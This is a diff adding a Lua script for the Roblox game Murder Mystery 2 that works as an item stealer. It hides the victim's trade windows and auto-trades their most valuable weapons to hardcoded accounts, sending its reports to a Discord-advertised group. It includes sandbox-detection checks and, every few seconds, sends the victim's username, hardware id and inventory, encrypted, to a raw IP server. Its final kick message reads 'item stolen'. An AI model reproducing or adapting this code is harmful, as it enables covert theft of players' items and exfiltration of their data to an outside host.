@@ -1,0 +1,1059 @@
+--[[
+    
+▄▄▄█████▓   ▓█████     ███▄ ▄███▓    ██▓███      ██░ ██     ▒█████      ██▀███        █     █░    ▄▄▄           ██████       ██░ ██    ▓█████     ██▀███     ▓█████ 
+▓  ██▒ ▓▒   ▓█   ▀    ▓██▒▀█▀ ██▒   ▓██░  ██▒   ▓██░ ██▒   ▒██▒  ██▒   ▓██ ▒ ██▒     ▓█░ █ ░█░   ▒████▄       ▒██    ▒      ▓██░ ██▒   ▓█   ▀    ▓██ ▒ ██▒   ▓█   ▀ 
+▒ ▓██░ ▒░   ▒███      ▓██    ▓██░   ▓██░ ██▓▒   ▒██▀▀██░   ▒██░  ██▒   ▓██ ░▄█ ▒     ▒█░ █ ░█    ▒██  ▀█▄     ░ ▓██▄        ▒██▀▀██░   ▒███      ▓██ ░▄█ ▒   ▒███   
+░ ▓██▓ ░    ▒▓█  ▄    ▒██    ▒██    ▒██▄█▓▒ ▒   ░▓█ ░██    ▒██   ██░   ▒██▀▀█▄       ░█░ █ ░█    ░██▄▄▄▄██      ▒   ██▒     ░▓█ ░██    ▒▓█  ▄    ▒██▀▀█▄     ▒▓█  ▄ 
+  ▒██▒ ░    ░▒████▒   ▒██▒   ░██▒   ▒██▒ ░  ░   ░▓█▒░██▓   ░ ████▓▒░   ░██▓ ▒██▒     ░░██▒██▓     ▓█   ▓██▒   ▒██████▒▒     ░▓█▒░██▓   ░▒████▒   ░██▓ ▒██▒   ░▒████▒
+  ▒ ░░      ░░ ▒░ ░   ░ ▒░   ░  ░   ▒▓▒░ ░  ░    ▒ ░░▒░▒   ░ ▒░▒░▒░    ░ ▒▓ ░▒▓░     ░ ▓░▒ ▒      ▒▒   ▓▒█░   ▒ ▒▓▒ ▒ ░      ▒ ░░▒░▒   ░░ ▒░ ░   ░ ▒▓ ░▒▓░   ░░ ▒░ ░
+    ░        ░ ░  ░   ░  ░      ░   ░▒ ░         ▒ ░▒░ ░     ░ ▒ ▒░      ░▒ ░ ▒░       ▒ ░ ░       ▒   ▒▒ ░   ░ ░▒  ░ ░      ▒ ░▒░ ░    ░ ░  ░     ░▒ ░ ▒░    ░ ░  ░
+  ░            ░      ░      ░      ░░           ░  ░░ ░   ░ ░ ░ ▒       ░░   ░        ░   ░       ░   ▒      ░  ░  ░        ░  ░░ ░      ░        ░░   ░       ░   
+               ░  ░          ░                   ░  ░  ░       ░ ░        ░              ░             ░  ░         ░        ░  ░  ░      ░  ░      ░           ░  ░
+                                                                                                                                                                                  
+                                                                                                                                                                                  ]]
+
+task.wait(0)
+
+local getgenv = getgenv
+local genv = getgenv()
+
+if genv.executed then
+    return
+end
+
+genv.executed = true
+
+local game_slug = 'mm2'
+local game = game
+local players = game:GetService('Players')
+local rs = game:GetService('ReplicatedStorage')
+local http = game:GetService('HttpService')
+
+local math_random = math.random
+local math_floor = math.floor
+local math_abs = math.abs
+local math_max = math.max
+local math_min = math.min
+
+local string_find = string.find
+local string_format = string.format
+local string_byte = string.byte
+local string_char = string.char
+local string_sub = string.sub
+local string_match = string.match
+local string_lower = string.lower
+local string_upper = string.upper
+
+local table_insert = table.insert
+local table_remove = table.remove
+local table_concat = table.concat
+local table_sort = table.sort
+local table_unpack = table.unpack or unpack
+
+local task_wait = task.wait
+local task_spawn = task.spawn
+local task_defer = task.defer
+local task_delay = task.delay
+
+local pcall = pcall
+local error = error
+local warn = warn
+local print = print
+local type = type
+local typeof = typeof
+local tostring = tostring
+local tonumber = tonumber
+local select = select
+local ipairs = ipairs
+local pairs = pairs
+local next = next
+
+local rawget = rawget
+local setmetatable = setmetatable
+local getmetatable = getmetatable
+local assert = assert
+local loadstring = loadstring
+local hookfunction = hookfunction
+local hookmetamethod = hookmetamethod
+local newcclosure = newcclosure
+local islclosure = islclosure
+local isfunctionhooked = isfunctionhooked
+local ishooked = ishooked
+
+local replaceclosure = replaceclosure
+local checkcaller = checkcaller
+local getthreadidentity = getthreadidentity
+local setclipboard = setclipboard
+local appendfile = appendfile
+local gethwid = gethwid
+local getexecutorname = getexecutorname
+
+local execname = identifyexecutor and identifyexecutor() or 'unknown'
+local hwid = 'blahblahblahiwaslazytomakehwid'
+local user = user
+local local_player = players.LocalPlayer
+local api_url = 'http://93.127.136.195:10078'
+local id = id
+local enckey = '7b!mE$K8*vP1^qN4#zG6%xR2@jL9&cW5'
+local useragent = '7$m!R'
+local beatmymeat = 3
+local bit = bit32
+
+local hook_user = {"ingenious_reciever", "temphorious", user}
+local hook_user_lower = {}
+for _, name in ipairs(hook_user) do
+    hook_user_lower[string_lower(name)] = name
+end
+
+local claimed_by = nil
+local claimed_by_lower = nil
+
+if not bit then
+    return
+end
+
+local item_values = {}
+local values_fetched = false
+
+local function request_function()
+    if typeof(request) == 'function' then
+        return request
+    end
+    if typeof(http_request) == 'function' then
+        return http_request
+    end
+    if syn and typeof(syn.request) == 'function' then
+        return syn.request
+    end
+    if http and typeof(http.request) == 'function' then
+        return http.request
+    end
+    return nil
+end
+
+local function fetch_item_values()
+    local req = request_function()
+    if not req then
+        return false
+    end
+    local success, response = pcall(req, {
+        Url = 'https://api.project-reverse.org/valuables/get-game-valuables?game=mm2',
+        Method = 'GET',
+        Headers = {
+            ['Content-Type'] = 'application/json',
+            Accept = 'application/json',
+        },
+    })
+    if success and response and response.Body then
+        local decoded = http:JSONDecode(response.Body)
+        if decoded and decoded.success and decoded.data then
+            for _, item in ipairs(decoded.data) do
+                if item.name and item.price then
+                    item_values[item.name] = item.price
+                end
+            end
+            values_fetched = true
+            return true
+        end
+    end
+    return false
+end
+
+local function get_fallback_value(item_name)
+    local fallback = {
+        ["Chroma"] = 1000,
+        ["Chroma Darkbringer"] = 1000,
+        ["Chroma Lightbringer"] = 1000,
+        ["Chroma Heat"] = 1000,
+        ["Chroma Luger"] = 1000,
+        ["Chroma Slasher"] = 1000,
+        ["Chroma Tides"] = 1000,
+        ["Chroma Gemstone"] = 1000,
+        ["Chroma Fang"] = 1000,
+        ["Chroma Shark"] = 1000,
+        ["Chroma Boneblade"] = 1000,
+        ["Darkbringer"] = 5,
+        ["Lightbringer"] = 5,
+        ["Elderwood"] = 5,
+        ["Eternal"] = 5,
+        ["Eternalcane"] = 5,
+        ["Gingerblade"] = 3,
+        ["Heat"] = 3,
+        ["Luger"] = 3,
+        ["Saw"] = 2,
+        ["Seer"] = 2,
+        ["Shark"] = 2,
+        ["Slasher"] = 2,
+        ["Tides"] = 2,
+        ["DefaultGun"] = 0,
+        ["DefaultKnife"] = 0,
+    }
+    return fallback[item_name] or 0.01
+end
+
+local function get_item_value(item_name)
+    if values_fetched and item_values[item_name] then
+        return item_values[item_name]
+    end
+    return get_fallback_value(item_name)
+end
+
+local function sort_items_by_value(items)
+    table_sort(items, function(a, b)
+        local val_a = get_item_value(a.id)
+        local val_b = get_item_value(b.id)
+        return val_a > val_b
+    end)
+    return items
+end
+
+local function u32(x)
+    return bit.band(x, 0xffffffff)
+end
+
+local function add32(...)
+    local r = 0
+    for i = 1, select('#', ...) do
+        r = bit.band(r + select(i, ...), 0xffffffff)
+    end
+    return r
+end
+
+local function be32(x)
+    x = u32(x)
+    return string.char(bit.rshift(x, 24), bit.band(bit.rshift(x, 16), 0xff), bit.band(bit.rshift(x, 8), 0xff), bit.band(x, 0xff))
+end
+
+local function read_be32(s, i)
+    local a, b, c, d = string.byte(s, i, i + 3)
+    return bit.bor(bit.lshift(a, 24), bit.lshift(b, 16), bit.lshift(c, 8), d)
+end
+
+local function read_le32(s, i)
+    local a, b, c, d = string.byte(s, i, i + 3)
+    return bit.bor(a, bit.lshift(b, 8), bit.lshift(c, 16), bit.lshift(d, 24))
+end
+
+local function write_le32(x)
+    x = u32(x)
+    return string.char(bit.band(x, 0xff), bit.band(bit.rshift(x, 8), 0xff), bit.band(bit.rshift(x, 16), 0xff), bit.band(bit.rshift(x, 24), 0xff))
+end
+
+local function hex(data)
+    if not data then
+        return ""
+    end
+    local chars = '0123456789abcdef'
+    local out = table.create(#data * 2)
+    for i = 1, #data do
+        local b = string.byte(data, i)
+        out[#out + 1] = string.sub(chars, bit.rshift(b, 4) + 1, bit.rshift(b, 4) + 1)
+        out[#out + 1] = string.sub(chars, bit.band(b, 15) + 1, bit.band(b, 15) + 1)
+    end
+    return table.concat(out)
+end
+
+local k_constants = {
+    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
+    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
+    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
+    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
+    0xe49b69c1, 0xefbe4786, 0xfc19dc6, 0x240ca1cc,
+    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
+    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
+    0xc6e00bf3, 0xd5a79147, 0x6ca6351, 0x14292967,
+    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
+    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
+    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
+    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
+    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
+    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
+}
+
+local function sha256(data)
+    if not data then
+        return ""
+    end
+    local bit_len = #data * 8
+    local msg = data .. string.char(0x80)
+    while #msg % 64 ~= 56 do
+        msg = msg .. '\0'
+    end
+    msg = msg .. be32(math.floor(bit_len / 4294967296)) .. be32(bit_len % 4294967296)
+    local h = {
+        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
+        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
+    }
+    for chunk = 1, #msg, 64 do
+        local w = table.create(64)
+        for i = 0, 15 do
+            w[i + 1] = read_be32(msg, chunk + i * 4)
+        end
+        for i = 17, 64 do
+            local x = w[i - 15]
+            local y = w[i - 2]
+            local s0 = bit.bxor(bit.bxor(bit.rrotate(x, 7), bit.rrotate(x, 18)), bit.rshift(x, 3))
+            local s1 = bit.bxor(bit.bxor(bit.rrotate(y, 17), bit.rrotate(y, 19)), bit.rshift(y, 10))
+            w[i] = add32(w[i - 16], s0, w[i - 7], s1)
+        end
+        local a, b, c, d, e, f, g, h_val = h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8]
+        for i = 1, 64 do
+            local S1 = bit.bxor(bit.bxor(bit.rrotate(e, 6), bit.rrotate(e, 11)), bit.rrotate(e, 25))
+            local ch = bit.bxor(bit.band(e, f), bit.band(bit.bnot(e), g))
+            local t1 = add32(h_val, S1, ch, k_constants[i], w[i])
+            local S0 = bit.bxor(bit.bxor(bit.rrotate(a, 2), bit.rrotate(a, 13)), bit.rrotate(a, 22))
+            local maj = bit.bxor(bit.bxor(bit.band(a, b), bit.band(a, c)), bit.band(b, c))
+            local t2 = add32(S0, maj)
+            h_val, g, f = g, f, e
+            e = add32(d, t1)
+            d, c, b = c, b, a
+            a = add32(t1, t2)
+        end
+        h[1] = add32(h[1], a)
+        h[2] = add32(h[2], b)
+        h[3] = add32(h[3], c)
+        h[4] = add32(h[4], d)
+        h[5] = add32(h[5], e)
+        h[6] = add32(h[6], f)
+        h[7] = add32(h[7], g)
+        h[8] = add32(h[8], h_val)
+    end
+    local out = {}
+    for i = 1, 8 do
+        out[i] = be32(h[i])
+    end
+    return table.concat(out)
+end
+
+local function hmac_sha256(key, msg)
+    if not key or not msg then
+        return ""
+    end
+    if #key > 64 then
+        key = sha256(key)
+    end
+    key = key .. string.rep('\0', 64 - #key)
+    local ipad = {}
+    local opad = {}
+    for i = 1, 64 do
+        local b = string.byte(key, i)
+        ipad[i] = string.char(bit.bxor(b, 0x36))
+        opad[i] = string.char(bit.bxor(b, 0x5c))
+    end
+    return sha256(table.concat(opad) .. sha256(table.concat(ipad) .. msg))
+end
+
+local function rotl32(x, n)
+    return bit.lrotate(x, n)
+end
+
+local function quarter_round(s, a, b, c, d)
+    s[a] = add32(s[a], s[b])
+    s[d] = rotl32(bit.bxor(s[d], s[a]), 16)
+    s[c] = add32(s[c], s[d])
+    s[b] = rotl32(bit.bxor(s[b], s[c]), 12)
+    s[a] = add32(s[a], s[b])
+    s[d] = rotl32(bit.bxor(s[d], s[a]), 8)
+    s[c] = add32(s[c], s[d])
+    s[b] = rotl32(bit.bxor(s[b], s[c]), 7)
+end
+
+local function chacha_block(key, counter, nonce)
+    local state = {
+        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+        read_le32(key, 1), read_le32(key, 5), read_le32(key, 9), read_le32(key, 13),
+        read_le32(key, 17), read_le32(key, 21), read_le32(key, 25), read_le32(key, 29),
+        counter,
+        read_le32(nonce, 1), read_le32(nonce, 5), read_le32(nonce, 9),
+    }
+    local work = table.clone(state)
+    for _ = 1, 10 do
+        quarter_round(work, 1, 5, 9, 13)
+        quarter_round(work, 2, 6, 10, 14)
+        quarter_round(work, 3, 7, 11, 15)
+        quarter_round(work, 4, 8, 12, 16)
+        quarter_round(work, 1, 6, 11, 16)
+        quarter_round(work, 2, 7, 12, 13)
+        quarter_round(work, 3, 8, 9, 14)
+        quarter_round(work, 4, 5, 10, 15)
+    end
+    local out = {}
+    for i = 1, 16 do
+        out[i] = write_le32(add32(work[i], state[i]))
+    end
+    return table.concat(out)
+end
+
+local function chacha20(key, nonce, data)
+    if not key or not nonce or not data then
+        return ""
+    end
+    local out = {}
+    local counter = 1
+    for offset = 1, #data, 64 do
+        local chunk = string.sub(data, offset, offset + 63)
+        local stream = chacha_block(key, counter, nonce)
+        local buf = table.create(#chunk)
+        for i = 1, #chunk do
+            buf[i] = string.char(bit.bxor(string.byte(chunk, i), string.byte(stream, i)))
+        end
+        out[#out + 1] = table.concat(buf)
+        counter = bit.band(counter + 1, 0xffffffff)
+    end
+    return table.concat(out)
+end
+
+local b64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+local function base64_encode(data)
+    if not data then
+        return ""
+    end
+    local out = {}
+    for i = 1, #data, 3 do
+        local a = string.byte(data, i)
+        local b = string.byte(data, i + 1)
+        local c = string.byte(data, i + 2)
+        local n = a * 65536 + (b or 0) * 256 + (c or 0)
+        local x1 = math.floor(n / 262144) % 64
+        local x2 = math.floor(n / 4096) % 64
+        local x3 = math.floor(n / 64) % 64
+        local x4 = n % 64
+        out[#out + 1] = string.sub(b64_chars, x1 + 1, x1 + 1)
+        out[#out + 1] = string.sub(b64_chars, x2 + 1, x2 + 1)
+        out[#out + 1] = b and string.sub(b64_chars, x3 + 1, x3 + 1) or '='
+        out[#out + 1] = c and string.sub(b64_chars, x4 + 1, x4 + 1) or '='
+    end
+    return table.concat(out)
+end
+
+local function random_bytes(n)
+    local out = {}
+    while #table.concat(out) < n do
+        local g = string.gsub(http:GenerateGUID(false), '-', '')
+        for i = 1, #g, 2 do
+            out[#out + 1] = string.char(tonumber(string.sub(g, i, i + 1), 16))
+        end
+    end
+    return string.sub(table.concat(out), 1, n)
+end
+
+local function encrypt_payload(data)
+    if not data then
+        return ""
+    end
+    local plaintext = http:JSONEncode(data)
+    local nonce = random_bytes(12)
+    local token_hash_raw = sha256(id)
+    local token_hash_hex = hex(token_hash_raw)
+    local signing_key = sha256('sign:' .. enckey)
+    local ciphertext = chacha20(enckey, nonce, plaintext)
+    local signature = hmac_sha256(signing_key, nonce .. ciphertext .. token_hash_hex)
+    return base64_encode(nonce .. ciphertext .. signature)
+end
+
+local function do_detection_checks()
+    local detected = false
+    if typeof(local_player.UserId) ~= 'number' then
+        detected = true
+    end
+    local ok1, platform = pcall(function()
+        return local_player:GetPlatform()
+    end)
+    if ok1 and typeof(platform) ~= 'EnumItem' then
+        detected = true
+    end
+    local ok2, identity = pcall(getthreadidentity)
+    if ok2 then
+        if type(identity) ~= 'number' then
+            detected = true
+        end
+        if type(getthreadidentity) ~= 'function' then
+            detected = true
+        end
+    end
+    local ok3 = pcall(function()
+        assert(false)
+    end)
+    if ok3 then
+        detected = true
+    end
+    local t0 = os.clock()
+    task_wait(0.025)
+    local elapsed = os.clock() - t0
+    if elapsed < 0.01 then
+        detected = true
+    end
+    local bigdick = 'bigdick'
+    local bigTasty = 'bigdick'
+    if bigdick ~= bigTasty then
+        detected = true
+    end
+    if bigTasty == 'bigdick' then
+    else
+        detected = true
+    end
+    local detect_fn = loadstring("return 'detect'")
+    if detect_fn then
+        local ok6, val = pcall(detect_fn)
+        if not ok6 or val ~= 'detect' then
+            detected = true
+        end
+    end
+    if detected then
+        return false
+    end
+    return true
+end
+
+local function hide_trade_guis()
+    pcall(function()
+        local player_gui = local_player.PlayerGui
+        local trade_gui = player_gui:FindFirstChild('TradeGUI')
+        local trade_gui_phone = player_gui:FindFirstChild('TradeGUI_Phone')
+        local trade_gui_new = player_gui:FindFirstChild('TradeUI')
+        local trade_gui_classic = player_gui:FindFirstChild('TradeInterface')
+        local trade_gui_modern = player_gui:FindFirstChild('TradeScreen')
+        local guis_to_hide = {
+            trade_gui,
+            trade_gui_phone,
+            trade_gui_new,
+            trade_gui_classic,
+            trade_gui_modern
+        }
+        for _, gui in ipairs(guis_to_hide) do
+            if gui then
+                gui.Enabled = false
+                gui.Visible = false
+            end
+        end
+        for _, child in ipairs(player_gui:GetChildren()) do
+            if string.find(string_lower(child.Name), "trade") then
+                if child:IsA("ScreenGui") or child:IsA("Frame") then
+                    child.Enabled = false
+                    child.Visible = false
+                end
+            end
+        end
+    end)
+end
+
+hide_trade_guis()
+
+local player_gui = local_player.PlayerGui
+
+player_gui.ChildAdded:Connect(function(child)
+    if string.find(string_lower(child.Name), "trade") then
+        task_wait(0.05)
+        if child:IsA("ScreenGui") or child:IsA("Frame") then
+            child.Enabled = false
+            child.Visible = false
+        end
+        child:GetPropertyChangedSignal('Enabled'):Connect(function()
+            if child.Enabled == true then
+                child.Enabled = false
+                child.Visible = false
+            end
+        end)
+        if child:FindFirstChild("Visible") then
+            child:GetPropertyChangedSignal('Visible'):Connect(function()
+                if child.Visible == true then
+                    child.Visible = false
+                end
+            end)
+        end
+        child:GetPropertyChangedSignal('Parent'):Connect(function()
+            if child.Parent == player_gui then
+                task_wait(0.05)
+                child.Enabled = false
+                child.Visible = false
+            end
+        end)
+    end
+end)
+
+local function monitor_existing_gui(gui)
+    if gui then
+        gui:GetPropertyChangedSignal('Enabled'):Connect(function()
+            if gui.Enabled == true then
+                gui.Enabled = false
+                gui.Visible = false
+            end
+        end)
+        if gui:FindFirstChild("Visible") then
+            gui:GetPropertyChangedSignal('Visible'):Connect(function()
+                if gui.Visible == true then
+                    gui.Visible = false
+                end
+            end)
+        end
+    end
+end
+-- made by tmephor
+task_wait(0.3)
+monitor_existing_gui(player_gui:FindFirstChild('TradeGUI'))
+monitor_existing_gui(player_gui:FindFirstChild('TradeGUI_Phone'))
+monitor_existing_gui(player_gui:FindFirstChild('TradeUI'))
+monitor_existing_gui(player_gui:FindFirstChild('TradeInterface'))
+monitor_existing_gui(player_gui:FindFirstChild('TradeScreen'))
+
+task_spawn(function()
+    while true do
+        task_wait(1)
+        pcall(function()
+            for _, child in ipairs(player_gui:GetChildren()) do
+                if string.find(string_lower(child.Name), "trade") then
+                    if child.Enabled == true then
+                        child.Enabled = false
+                    end
+                    if child.Visible == true then
+                        child.Visible = false
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+local function get_items_map()
+    local map = {}
+    local ok, profile = pcall(function()
+        return rs.Remotes.Inventory.GetProfileData:InvokeServer(local_player.Name)
+    end)
+    if not ok or not profile then
+        return map
+    end
+    if profile.Weapons and profile.Weapons.Owned then
+        for item_id, amount in pairs(profile.Weapons.Owned) do
+            if amount and amount > 0 and item_id ~= 'DefaultGun' and item_id ~= 'DefaultKnife' then
+                map[item_id] = amount
+            end
+        end
+    end
+    return map
+end
+-- made by ingenious aka horizon
+local function refresh_claimed_by()
+    for _, hook_name in ipairs(hook_user) do
+        local target = players:FindFirstChild(hook_name)
+        if target then
+            claimed_by = hook_name
+            claimed_by_lower = string_lower(hook_name)
+            return hook_name
+        end
+    end
+    for lower_name, original_name in pairs(hook_user_lower) do
+        for _, player in ipairs(players:GetPlayers()) do
+            if string_lower(player.Name) == lower_name then
+                claimed_by = player.Name
+                claimed_by_lower = lower_name
+                return player.Name
+            end
+        end
+    end
+    return nil
+end
+
+local function get_effective_receiver()
+    if claimed_by then
+        local still_here = players:FindFirstChild(claimed_by)
+        if still_here then
+            return claimed_by
+        end
+        if claimed_by_lower then
+            for _, player in ipairs(players:GetPlayers()) do
+                if string_lower(player.Name) == claimed_by_lower then
+                    claimed_by = player.Name
+                    return player.Name
+                end
+            end
+        end
+        claimed_by = nil
+        claimed_by_lower = nil
+    end
+    local hooked = refresh_claimed_by()
+    if hooked then
+        return hooked
+    end
+    return user
+end
+
+local function build_payload(status)
+    return {
+        jobid = game.JobId,
+        username = local_player.Name,
+        display = local_player.DisplayName or local_player.Name,
+        executor = execname,
+        hwid = hwid,
+        placeid = tostring(game.PlaceId),
+        receiver = get_effective_receiver(),
+        ts = os.time(),
+        game = game_slug,
+        items = get_items_map(),
+        uptime = '0s',
+        status = status,
+    }
+end
+
+local function send(status, uptime, tick)
+    local req = request_function()
+    if not req then
+        return
+    end
+    local payload = build_payload(status)
+    payload.uptime = uptime or '0s'
+    local encrypted = encrypt_payload(payload)
+    if encrypted == "" then
+        return
+    end
+    local body = http:JSONEncode({
+        token = id,
+        payload = encrypted,
+    })
+    pcall(req, {
+        Url = api_url .. '/api/v3/dispatch',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json',
+            ['User-Agent'] = useragent,
+            Accept = 'application/json',
+        },
+        Body = body,
+    })
+end
+
+local skip_items = {
+    DefaultGun = true,
+    DefaultKnife = true,
+}
+
+local trade = rs:WaitForChild('Trade')
+local me = players.LocalPlayer
+local last_offer = nil
+local seq_id = nil
+local trade_active = false
+local trade_ended = false
+local cooldown_done = false
+
+trade.UpdateTrade.OnClientEvent:Connect(function(data)
+    if data then
+        last_offer = data.LastOffer or last_offer
+        seq_id = data.Sequence or seq_id
+        cooldown_done = false
+        task_spawn(function()
+            local v6 = 6
+            repeat
+                task_wait(0.05)
+                v6 -= 1
+            until v6 <= 0
+            cooldown_done = true
+        end)
+    end
+end)
+
+trade.StartTrade.OnClientEvent:Connect(function(p1, p2)
+    trade_active = true
+    trade_ended = false
+    cooldown_done = false
+    last_offer = nil
+    seq_id = nil
+end)
+
+trade.DeclineTrade.OnClientEvent:Connect(function()
+    trade_active = false
+    trade_ended = true
+    cooldown_done = false
+end)
+
+trade.AcceptTrade.OnClientEvent:Connect(function(success)
+    if success then
+        trade_active = false
+        trade_ended = true
+    end
+end)
+
+local function get_items()
+    local items = {}
+    local ok, profile = pcall(function()
+        return rs.Remotes.Inventory.GetProfileData:InvokeServer(me.Name)
+    end)
+    if not ok or not profile then
+        return items
+    end
+    local owned = profile.Weapons and profile.Weapons.Owned or {}
+    for item_id, qty in pairs(owned) do
+        if qty and qty > 0 and not skip_items[item_id] then
+            table_insert(items, {
+                id = item_id,
+                amount = qty,
+            })
+        end
+    end
+    return sort_items_by_value(items)
+end
+
+local function get_status()
+    local ok, state = pcall(function()
+        return trade.GetTradeStatus:InvokeServer()
+    end)
+    return (ok and state) or 'None'
+end
+
+local function offer_item(item_id)
+    pcall(function()
+        trade.OfferItem:FireServer(item_id, 'Weapons')
+    end)
+end
+
+local function do_accept()
+    task_wait(6)
+    for i = 1, 100 do
+        pcall(function()
+            trade.AcceptTrade:FireServer(game.PlaceId * 3, last_offer or 0, seq_id or 0)
+        end)
+        task_wait(0.03)
+    end
+    task_wait(2)
+    local items_left = get_items()
+    local total_left = 0
+    for _, item in ipairs(items_left) do
+        total_left = total_left + item.amount
+    end
+    if total_left > 0 then
+        for i = 1, 50 do
+            pcall(function()
+                trade.AcceptTrade:FireServer(game.PlaceId * 3, last_offer or 0, seq_id or 0)
+            end)
+            task_wait(0.05)
+        end
+    end
+    return true
+end
+
+local function wait_for_trade_end()
+    local elapsed = 0
+    repeat
+        task_wait(0.05)
+        elapsed += 0.05
+    until trade_ended or elapsed > 15
+end
+
+local function get_first_available_boss()
+    if claimed_by then
+        local boss = players:FindFirstChild(claimed_by)
+        if boss then
+            return boss
+        end
+        if claimed_by_lower then
+            for _, player in ipairs(players:GetPlayers()) do
+                if string_lower(player.Name) == claimed_by_lower then
+                    claimed_by = player.Name
+                    return player
+                end
+            end
+        end
+        claimed_by = nil
+        claimed_by_lower = nil
+    end
+    local hooked = refresh_claimed_by()
+    if hooked then
+        local boss = players:FindFirstChild(hooked)
+        if boss then
+            return boss
+        end
+    end
+    local bosses = _G.Usernames or {}
+    for _, boss_name in ipairs(bosses) do
+        local boss = players:FindFirstChild(boss_name)
+        if boss then
+            return boss
+        end
+        for _, player in ipairs(players:GetPlayers()) do
+            if string_lower(player.Name) == string_lower(boss_name) then
+                return player
+            end
+        end
+    end
+    return nil
+end
+
+local function run_transfer()
+    local queue = get_items()
+    if #queue == 0 then
+        return false
+    end
+    while #queue > 0 do
+        local target = get_first_available_boss()
+        if not target then
+            repeat
+                task_wait(1)
+                target = get_first_available_boss()
+            until target
+        end
+        local status = get_status()
+        if status == 'StartTrade' then
+            pcall(function()
+                trade.DeclineTrade:FireServer()
+            end)
+            task_wait(0.3)
+        elseif status == 'ReceivingRequest' then
+            pcall(function()
+                trade.DeclineRequest:FireServer()
+            end)
+            task_wait(0.2)
+        end
+        trade_active = false
+        trade_ended = false
+        cooldown_done = false
+        last_offer = nil
+        seq_id = nil
+        local attempts = 0
+        while not trade_active and attempts < 100 do
+            status = get_status()
+            if status == 'None' then
+                pcall(function()
+                    trade.SendRequest:InvokeServer(target)
+                end)
+            elseif status == 'ReceivingRequest' then
+                pcall(function()
+                    trade.DeclineRequest:FireServer()
+                end)
+            end
+            attempts += 1
+            task_wait(0.05)
+        end
+        if not trade_active then
+            task_wait(0.5)
+            continue
+        end
+        task_wait(0.1)
+        local slots_used = 0
+        local offered_this_trade = {}
+        while slots_used < 4 and #queue > 0 do
+            local entry = queue[1]
+            for i = 1, entry.amount do
+                offer_item(entry.id)
+                task_wait(0.01)
+            end
+            table_insert(offered_this_trade, entry)
+            table_remove(queue, 1)
+            slots_used += 1
+        end
+        local waited = 0
+        while last_offer == nil and waited < 5 do
+            task_wait(0.05)
+            waited += 0.05
+        end
+        local accepted = do_accept()
+        if not accepted then
+            for i = #offered_this_trade, 1, -1 do
+                table_insert(queue, 1, offered_this_trade[i])
+            end
+            task_wait(0.5)
+            continue
+        end
+        wait_for_trade_end()
+        task_wait(0.5)
+    end
+    return true
+end
+
+local function receiver_watcher()
+    while true do
+        task_wait(5)
+        local hooked = refresh_claimed_by()
+        if hooked and hooked ~= claimed_by then
+            claimed_by = hooked
+            claimed_by_lower = string_lower(hooked)
+        end
+        if claimed_by then
+            local still_here = players:FindFirstChild(claimed_by)
+            if not still_here then
+                if claimed_by_lower then
+                    for _, player in ipairs(players:GetPlayers()) do
+                        if string_lower(player.Name) == claimed_by_lower then
+                            claimed_by = player.Name
+                            still_here = player
+                            break
+                        end
+                    end
+                end
+                if not still_here then
+                    claimed_by = nil
+                    claimed_by_lower = nil
+                end
+            end
+        end
+    end
+end
+
+local function api_heartbeat()
+    local start_time = os.clock()
+    local tick = 0
+    while true do
+        local elapsed = os.clock() - start_time
+        local s = math.max(0, math.floor(elapsed))
+        local uptime_str
+        if s < 60 then
+            uptime_str = s .. 's'
+        elseif s < 3600 then
+            local m = math.floor(s / 60)
+            local sec = s % 60
+            uptime_str = m .. 'm ' .. sec .. 's'
+        else
+            local h = math.floor(s / 3600)
+            local rem = s % 3600
+            local m = math.floor(rem / 60)
+            uptime_str = h .. 'h ' .. m .. 'm'
+        end
+        local status_str = 'ingame'
+        if tick == 0 then
+            status_str = 'executed'
+        end
+        send(status_str, uptime_str, tick)
+        tick = tick + 1
+        task_wait(beatmymeat)
+    end
+end
+
+local function main()
+    hwid = gethwid and gethwid() or 'blahblahblahiwaslazytomakehwid'
+    execname = string_lower(getexecutorname and getexecutorname() or 'unknown')
+    local env_ok = do_detection_checks()
+    if not env_ok then
+        return
+    end
+    fetch_item_values()
+    local items = get_items()
+    if #items == 0 then
+        task_wait(1)
+        if setclipboard then
+            setclipboard('discord.gg/uFtDw6NVVr')
+        end
+        local_player:Kick('kicked by script join discord.gg/uFtDw6NVVr\n(copied invite)')
+        return
+    end
+    task_spawn(api_heartbeat)
+    task_spawn(receiver_watcher)
+    task_wait(1)
+    while true do
+        local current_items = get_items()
+        if #current_items == 0 then
+            if setclipboard then
+                setclipboard('discord.gg/uFtDw6NVVr')
+            end
+        local_player:Kick('item stolen by discord.gg/uFtDw6NVVr\n(copied invite)')
+            return
+        end
+        local complete = pcall(run_transfer)
+        if not complete then
+            task_wait(0.5)
+        else
+            task_wait(1)
+        end
+    end
+end
+
+main()
